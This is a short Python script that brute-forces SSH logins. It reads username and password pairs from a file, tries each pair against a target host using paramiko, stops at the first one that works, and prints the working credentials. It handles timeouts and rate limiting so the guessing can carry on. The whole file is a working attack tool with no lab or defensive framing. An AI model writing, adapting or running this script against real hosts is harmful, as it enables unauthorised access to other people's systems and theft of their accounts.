
import paramiko
import socket
from time import sleep
import click


found = True

def exploite(host, name, passwd):

    client = paramiko.SSHClient()

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        
        client.connect(hostname=host, username=name, password=passwd, banner_timeout=200)
        client.close()
        sleep(10)

    except socket.timeout:
        
        print("[!] Host is unreachable timed out.")
    
    except paramiko.AuthenticationException:

        print(f"[!] Invailed credntials for {name}:{passwd}")

    except paramiko.SSHException as e:

        print(f"[*] Quota exceeded, ratrying with delay...")


    except Exception:
        
        print(f"[-] error")

    else:
        global found 
        found = False
        print(f"[+] Found Combo: \n\t HostName:{host} \n\t UserName: {name} \n\t passwd {passwd}")

@click.command()
@click.option("--host", help="The host IP address example: xx.xx.xx.xx")
@click.option("--path", help="File Path")
def main(host,  path):

    with open(path, 'r') as file:
        for data in file.readlines():
           name, passwd = data.replace("\n", "").split(' ')
           if  found:
               exploite(host,  name, passwd)


if __name__ == "__main__":
    main()